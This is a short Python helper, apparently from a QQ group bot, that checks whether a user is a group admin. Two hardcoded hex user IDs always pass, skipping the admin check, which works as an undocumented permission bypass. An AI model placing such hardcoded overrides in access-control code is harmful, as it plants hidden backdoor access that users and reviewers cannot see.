class GroupHelper:
    @staticmethod
    async def has_permission(group_id: str, qq: str, origin: bool = False) -> bool:
        from common.group import Group
        if qq =='EE21E1DA3297AB70A9A072816DD75E98':
            return True
        if qq =='0D8312FD9AAC272E1452C32706E859AA':
            return True
        group = Group.get_group(group_id, origin)
        if group is not None:
            if qq in group.admins:
                return True
        return False
